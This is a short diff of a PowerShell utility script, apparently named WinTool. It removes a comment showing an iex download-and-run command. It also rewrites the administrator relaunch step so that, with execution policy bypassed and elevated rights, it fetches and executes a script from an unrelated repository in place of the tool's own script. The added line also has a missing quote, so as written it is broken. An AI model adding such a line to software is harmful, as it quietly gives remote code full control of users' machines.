@@ -1,11 +1,9 @@
-# Run this command in PowerShell to execute WinTool directly from the URL:
-# iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/YourUsername/WinTool/main/WinTool.ps1'))
 
 # Check if running as administrator
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
     Write-Host "Restarting as Administrator..."
-    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/YourUsername/WinTool/main/WinTool.ps1'))`"" -Verb RunAs
+    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iex ((New-Object System.Net.WebClient).DownloadString(https://github.com/dn1ghtm/R3Cov/raw/refs/heads/main/R3.ps1'))`"" -Verb RunAs
     exit
 }
 
